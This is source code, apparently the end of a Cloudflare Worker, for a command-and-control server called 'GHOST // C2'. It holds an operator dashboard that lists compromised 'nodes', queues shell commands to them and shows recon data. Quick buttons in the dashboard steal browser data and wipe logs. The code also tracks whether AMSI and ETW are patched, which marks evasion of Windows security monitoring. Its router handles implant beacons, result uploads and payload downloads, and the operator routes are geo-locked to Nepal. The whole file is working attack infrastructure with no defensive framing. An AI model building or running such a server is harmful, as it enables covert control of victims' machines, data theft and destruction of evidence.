/* ── SCROLLBAR ────────────────────────────────────────── */
::-webkit-scrollbar{width:4px;height:4px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border)}
</style>
</head>
<body>
<header>
  <div class="hdr-logo">
    <span class="ghost">GHOST</span><span class="c2">// C2</span>
  </div>
  <div class="hdr-status">
    <div class="pulse" id="pulse"></div>
    <span class="status-txt" id="status-txt">OFFLINE</span>
  </div>
  <div class="hdr-meta">
    SESSIONS <span id="hdr-count">0</span>
  </div>
  <div class="hdr-right">
    <span id="clock"></span>
    <button class="hdr-btn danger" onclick="logout()">LOGOUT</button>
  </div>
</header>
<div class="workspace">
  <div id="sidebar">
    <div class="pane-head">
      <span class="pane-label">Active Nodes</span>
      <button class="icon-btn" onclick="refreshSessions()" title="Refresh">&#x21bb;</button>
    </div>
    <div id="session-list"><div class="no-sessions">AWAITING CONNECTIONS</div></div>
  </div>

  <div id="main">
    <div id="tab-bar">
      <div class="tab active" data-tab="output" onclick="switchTab('output')">OUTPUT <span class="tab-count" id="tc-output">0</span></div>
      <div class="tab" data-tab="recon" onclick="switchTab('recon')">RECON</div>
    </div>
    <div id="session-header">
      <span class="sel-sid" id="sel-sid"></span>
      <span class="sel-meta" id="sel-meta"></span>
      <div class="sel-actions">
        <span id="last-poll" style="font-size:9px;letter-spacing:.08em;color:var(--muted);margin-right:8px"></span>
        <button class="act-btn" onclick="fetchResults()">REFRESH</button>
        <button class="act-btn kill" onclick="killSession()">KILL</button>
      </div>
    </div>
    <div id="empty-state">
      <div class="empty-glyph">[ ]</div>
      <div class="empty-msg">Select a node to begin</div>
    </div>
    <div id="output-pane"></div>
    <div id="recon-pane"></div>
    <div id="cmd-bar">
      <div class="cmd-row">
        <span class="cmd-prompt">ghost&gt;&nbsp;</span>
        <input id="cmd-input" placeholder="enter command..." onkeydown="if(event.key==='Enter')sendCmd()">
        <button class="act-btn" onclick="sendCmd()">EXEC</button>
      </div>
      <div class="quick-cmds">
        <button class="qcmd" onclick="sendCmd('whoami')">whoami</button>
        <button class="qcmd" onclick="sendCmd('ipconfig /all')">ipconfig</button>
        <button class="qcmd" onclick="sendCmd('tasklist')">tasklist</button>
        <button class="qcmd" onclick="sendCmd('systeminfo')">sysinfo</button>
        <button class="qcmd" onclick="sendCmd('!ps ')">ps</button>
        <button class="qcmd" onclick="sendCmd('!browser')">browsers</button>
        <button class="qcmd" onclick="sendCmd('!wipe')">wipe logs</button>
      </div>
    </div>
  </div>

  <div id="audit-panel">
    <div class="pane-head">
      <span class="pane-label">Audit Log</span>
      <button class="icon-btn" onclick="fetchAudit()" title="Refresh">&#x21bb;</button>
    </div>
    <div id="audit-list"><div class="no-sessions">NO ENTRIES</div></div>
  </div>
</div>
<div id="toast"></div>
<script>
(function(){
  const token = sessionStorage.getItem('ghost_token');
  if (!token) { location.href = '/'; return; }

  let selectedSid = null, pollTimer = null, auditTimer = null, currentTab = 'output';

  // ── Clock ──
  function tick() {
    const n = new Date();
    document.getElementById('clock').textContent =
      n.toISOString().replace('T',' ').slice(0,19) + ' UTC';
  }
  tick(); setInterval(tick, 1000);

  // ── Toast ──
  function toast(msg, type='ok', dur=2500) {
    const el = document.getElementById('toast');
    el.textContent = msg;
    el.className = 'show ' + type;
    clearTimeout(el._t);
    el._t = setTimeout(() => el.className = '', dur);
  }

  // ── API ──
  async function api(path, opts={}) {
    const r = await fetch(path, {
      headers: {'Content-Type':'application/json','X-Operator-Token':token},
      ...opts
    });
    if (r.status === 401) { toast('SESSION EXPIRED', 'err'); setTimeout(logout, 1500); return null; }
    return r;
  }

  function logout() {
    sessionStorage.removeItem('ghost_token');
    location.href = '/';
  }
  window.logout = logout;

  // ── Sessions ──
  async function refreshSessions() {
    const r = await api('/sessions');
    if (!r) return;
    const sessions = await r.json();
    const list = document.getElementById('session-list');
    document.getElementById('hdr-count').textContent = sessions.length;
    const pulse = document.getElementById('pulse');
    const stxt = document.getElementById('status-txt');
    if (sessions.length > 0) {
      pulse.className = 'pulse live';
      stxt.textContent = 'LIVE';
    } else {
      pulse.className = 'pulse';
      stxt.textContent = 'IDLE';
    }
    if (!sessions.length) {
      list.innerHTML = '<div class="no-sessions">NO ACTIVE NODES</div>';
      return;
    }
    sessions.sort((a,b)=>new Date(b.last_beacon)-new Date(a.last_beacon));
    list.innerHTML = sessions.map(s=>{
      const idle = s.idle_seconds;
      const stale = idle > 180;
      const bc = s.pending_tasks>0?'tasks':stale?'stale':'live';
      const bt = s.pending_tasks>0?(s.pending_tasks+' QUEUED'):stale?('STALE '+fmt(idle)):('LIVE '+fmt(idle));
      return \`<div class="session-item\${s.session===selectedSid?' active':''}" onclick="selectSession('\${esc(s.session)}')">
        <div class="sid">\${esc(s.session.slice(0,28))}\${s.session.length>28?'...':''}</div>
        <div class="smeta">\${esc(s.remote_ip)} // \${esc(s.recon?.hostname||'unknown')}</div>
        <div class="smeta">\${esc(s.recon?.user||'?')} \${s.recon?.elevated?'[ELEVATED]':''}</div>
        <span class="sbadge \${bc}"><span class="sbadge-dot"></span>\${bt}</span>
      </div>\`;
    }).join('');
  }
  window.refreshSessions = refreshSessions;

  // ── Select session ──
  async function selectSession(sid) {
    selectedSid = sid;
    document.getElementById('sel-sid').textContent = sid;
    document.getElementById('session-header').style.display = 'flex';
    document.getElementById('empty-state').style.display = 'none';
    document.getElementById('cmd-bar').style.display = 'block';
    switchTab(currentTab);
    await Promise.all([refreshSessions(), fetchResults(), fetchRecon()]);
  }
  window.selectSession = selectSession;

  // ── Tabs ──
  function switchTab(tab) {
    currentTab = tab;
    document.querySelectorAll('.tab').forEach(t=>t.classList.toggle('active',t.dataset.tab===tab));
    const op = document.getElementById('output-pane');
    const rp = document.getElementById('recon-pane');
    if (selectedSid) {
      op.style.display = tab==='output'?'flex':'none';
      op.style.flexDirection = 'column';
      rp.style.display = tab==='recon'?'block':'none';
    }
  }
  window.switchTab = switchTab;

  // ── Results ──
  let lastResultCount = 0;
  async function fetchResults() {
    if (!selectedSid) return;
    const r = await api('/results/'+encodeURIComponent(selectedSid));
    if (!r) return;
    const data = await r.json();
    const box = document.getElementById('output-pane');
    const tc = document.getElementById('tc-output');
    const entries = data.results||[];
    if (tc) tc.textContent = String(entries.length);

    // Update last-poll indicator
    const pollEl = document.getElementById('last-poll');
    if (pollEl) {
      const now = new Date();
      pollEl.textContent = 'SYNC ' + now.toUTCString().slice(17,25) + ' UTC';
      pollEl.style.color = 'var(--hi)';
      setTimeout(()=>{ if(pollEl) pollEl.style.color = 'var(--muted)'; }, 1200);
    }

    if (!entries.length) {
      if (box.dataset.sid !== selectedSid) {
        box.innerHTML = '<div style="color:var(--muted);font-size:10px;letter-spacing:.1em;padding:16px;text-transform:uppercase">Awaiting output...</div>';
        box.dataset.sid = selectedSid;
      }
      lastResultCount = 0;
      return;
    }

    const hasNew = entries.length !== lastResultCount;
    if (!hasNew && box.dataset.sid === selectedSid) return; // no change, skip redraw

    const atBottom = box.scrollHeight - box.scrollTop - box.clientHeight < 40;
    const sorted = entries.slice().sort((a,b)=>a.ts<b.ts?-1:1);
    box.innerHTML = sorted.map((e)=>
      \`<div class="result-entry">
        <div class="result-ts"><span class="ts-label">OUTPUT</span>\${esc(e.ts)}</div>
        <div class="result-body">\${esc(e.output)}</div>
      </div>\`
    ).join('');
    box.dataset.sid = selectedSid;

    if (atBottom || entries.length > lastResultCount) {
      box.scrollTop = box.scrollHeight;
    }
    lastResultCount = entries.length;
  }
  window.fetchResults = fetchResults;

  // ── Recon ──
  async function fetchRecon() {
    if (!selectedSid) return;
    const r = await api('/sessions');
    if (!r) return;
    const sessions = await r.json();
    const s = sessions.find(x=>x.session===selectedSid);
    if (!s) return;
    const recon = s.recon||{};
    // session header meta
    const parts = [s.remote_ip, recon.hostname, recon.os].filter(Boolean);
    document.getElementById('sel-meta').textContent = parts.join(' // ');
    // recon pane
    const cells = [
      {k:'hostname',v:recon.hostname,cls:'hi'},
      {k:'user',v:recon.user,cls:''},
      {k:'elevated',v:recon.elevated?'YES':'NO',cls:recon.elevated?'danger':''},
      {k:'remote ip',v:s.remote_ip,cls:''},
      {k:'os',v:recon.os,cls:''},
      {k:'build',v:recon.build,cls:''},
      {k:'arch',v:recon.arch,cls:''},
      {k:'domain',v:recon.domain,cls:''},
      {k:'amsi patched',v:recon.amsi?'YES':'NO',cls:recon.amsi?'hi':'warn'},
      {k:'etw patched',v:recon.etw?'YES':'NO',cls:recon.etw?'hi':'warn'},
      {k:'first seen',v:s.first_seen,cls:''},
      {k:'last beacon',v:s.last_beacon,cls:''},
      {k:'pending tasks',v:s.pending_tasks,cls:s.pending_tasks>0?'warn':''},
      {k:'results',v:s.result_count,cls:''},
    ].filter(c=>c.v!=null&&c.v!=='');
    document.getElementById('recon-pane').innerHTML =
      '<div class="recon-grid">' +
      cells.map(c=>\`<div class="recon-cell"><div class="recon-key">\${esc(c.k)}</div><div class="recon-val \${c.cls}">\${esc(String(c.v))}</div></div>\`).join('')+
      '</div>';
  }

  // ── Send command ──
  async function sendCmd(preset) {
    if (!selectedSid) return toast('NO NODE SELECTED', 'err');
    const input = document.getElementById('cmd-input');
    const cmd = preset || input.value.trim();
    if (!cmd) return;
    const r = await api('/task', {method:'POST', body:JSON.stringify({session:selectedSid,cmd})});
    if (!r) return;
    const data = await r.json();
    if (data.status==='queued') {
      toast('QUEUED // DEPTH='+data.queue_depth);
      if (!preset) input.value='';
    } else {
      toast('ERROR: '+JSON.stringify(data),'err');
    }
  }
  window.sendCmd = sendCmd;

  // ── Kill ──
  async function killSession() {
    if (!selectedSid || !confirm('Queue exit command for '+selectedSid+'?')) return;
    const r = await api('/sessions/'+encodeURIComponent(selectedSid),{method:'DELETE'});
    if (!r) return;
    toast('EXIT QUEUED');
    selectedSid = null;
    document.getElementById('session-header').style.display = 'none';
    document.getElementById('empty-state').style.display = 'flex';
    document.getElementById('output-pane').style.display = 'none';
    document.getElementById('recon-pane').style.display = 'none';
    document.getElementById('cmd-bar').style.display = 'none';
    await refreshSessions();
  }
  window.killSession = killSession;

  // ── Audit ──
  async function fetchAudit() {
    const r = await api('/audit?limit=80');
    if (!r) return;
    const data = await r.json();
    const list = document.getElementById('audit-list');
    const entries = (data.entries||[]).slice().reverse();
    if (!entries.length) { list.innerHTML = '<div class="no-sessions">NO ENTRIES</div>'; return; }
    list.innerHTML = entries.map(e=>{
      const t = e.ts.replace('T',' ').slice(0,19);
      return \`<div class="audit-entry \${esc(e.action)}">
        <div class="a-time">\${t}</div>
        <div class="a-action">\${esc(e.action)}</div>
        <div class="a-ip">\${esc(e.ip)}</div>
      </div>\`;
    }).join('');
  }
  window.fetchAudit = fetchAudit;

  function fmt(s){return s<60?s+'s':s<3600?Math.floor(s/60)+'m':Math.floor(s/3600)+'h'}
  function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')}

  // ── Boot ──
  refreshSessions();
  fetchAudit();
  pollTimer = setInterval(()=>{refreshSessions();if(selectedSid)fetchResults();},5000);
  auditTimer = setInterval(fetchAudit,15000);
})();
</script>
</body>
</html>`;
// ─── Geo Guard (dashboard routes only) ───────────────────

function isNepal(request: Request): boolean {
  const country = request.headers.get("CF-IPCountry") ?? "";
  return country === "NP";
}

function geoBlock(): Response {
  return new Response("403 Forbidden", { status: 403, headers: { "Content-Type": "text/plain" } });
}

// ─── Auth Handler ─────────────────────────────────────────

async function handleAuth(request: Request, env: Env): Promise<Response> {
  if (!isNepal(request)) return geoBlock();
  const body = await safeJson<{u?: string; p?: string}>(request);
  if (!body?.u || !body?.p) return errorResponse("Missing credentials", 400);
  const validUser = env.DASHBOARD_USER || "";
  const validPass = env.DASHBOARD_PASS || "";
  if (!validUser || !validPass) return errorResponse("Auth not configured", 503);
  if (!secureCompare(body.u, validUser) || !secureCompare(body.p, validPass)) {
    return errorResponse("Invalid credentials", 401);
  }
  return jsonResponse({ token: env.OPERATOR_TOKEN });
}

// ─── Router ───────────────────────────────────────────────

async function handleRequest(request: Request, env: Env): Promise<Response> {
  const url = new URL(request.url);
  const { pathname: path } = url;
  const method = request.method;

  // CORS preflight
  if (method === "OPTIONS") {
    return withCORS(new Response(null, { status: 204 }), env);
  }

  // ── Web UI (Nepal only) ───────────────────────────────────
  if (path === "/" && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    return new Response(LOGIN_HTML, {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
    });
  }
  if (path === "/dashboard" && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    return new Response(DASHBOARD_HTML, {
      status: 200,
      headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
    });
  }
  if (path === "/auth" && method === "POST") {
    return withCORS(await handleAuth(request, env), env);
  }

  // ── Public routes ──────────────────────────────────────
  if (path === "/health" && method === "GET") {
    return withCORS(handleHealth(), env);
  }
  if (path === "/ping" && method === "GET") {
    return withCORS(new Response("OK", { status: 200 }), env);
  }

  // ── Beacon routes (X-Beacon-Token) ────────────────────
  if (path === "/beacon" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleBeacon(request, env), env);
  }
  if (path === "/result" && method === "POST") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleResult(request, env), env);
  }
  if (path === "/payload" && method === "GET") {
    const authErr = requireBeaconToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleDownloadPayload(env), env);
  }

  // ── Operator routes (X-Operator-Token, Nepal only) ────────
  if (path === "/sessions" && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleListSessions(request, env), env);
  }
  if (path === "/task" && method === "POST") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAddTask(request, env), env);
  }
  if (path === "/audit" && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleAudit(request, env), env);
  }
  if (path === "/payload" && method === "POST") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    return withCORS(await handleUploadPayload(request, env), env);
  }

  // ── Parameterised operator routes ──────────────────────
  const resultsMatch = path.match(/^\/results\/(.+)$/);
  if (resultsMatch && method === "GET") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    const sid = decodeURIComponent(resultsMatch[1]);
    return withCORS(await handleGetResults(request, env, sid), env);
  }

  const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
  if (sessionsMatch && method === "DELETE") {
    if (!isNepal(request)) return geoBlock();
    const authErr = requireOperatorToken(request, env);
    if (authErr) return withCORS(authErr, env);
    const sid = decodeURIComponent(sessionsMatch[1]);
    return withCORS(await handleKillSession(request, env, sid), env);
  }

  return withCORS(errorResponse("Not found", 404), env);
}

export default {
  async fetch(request: Request, env: Env, _ctx: ExecutionContext): Promise<Response> {
    try {
      return await handleRequest(request, env);
    } catch (err) {
      const message = err instanceof Error ? err.message : "Internal error";
      console.error(`[error] ${message}`);
      return withCORS(errorResponse("Internal server error", 500), env);
    }
  },
};